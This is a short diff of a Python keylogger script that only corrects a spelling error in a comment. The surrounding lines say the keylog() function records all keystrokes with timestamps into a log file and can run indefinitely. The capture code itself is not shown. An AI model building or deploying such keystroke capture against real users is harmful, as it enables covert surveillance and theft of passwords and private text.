@@ -2,7 +2,7 @@
 import keyboard as kb
 import time
 
-# keylog function records all the keystrokes along with the time at which theu were recorded in a text file named log.
+# keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
  
 def keylog():
     # remove the until parameter and the keylogger will run indefinitely. 
